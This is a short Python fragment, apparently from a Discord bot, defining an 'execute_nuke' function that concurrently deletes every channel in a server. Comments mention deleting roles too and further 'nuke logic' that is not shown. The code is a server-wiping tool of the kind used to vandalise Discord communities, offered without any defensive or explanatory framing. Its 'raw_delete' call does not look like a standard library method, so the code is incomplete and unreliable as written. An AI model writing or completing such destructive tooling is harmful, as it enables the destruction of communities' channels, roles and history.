async def execute_nuke(bot, guild):
    # Delete all channels, roles, etc.
    tasks = []
    for channel in guild.channels:
        tasks.append(bot.raw_delete(guild.id, channel.id))
    await asyncio.gather(*tasks)
    # Rest of nuke logic...
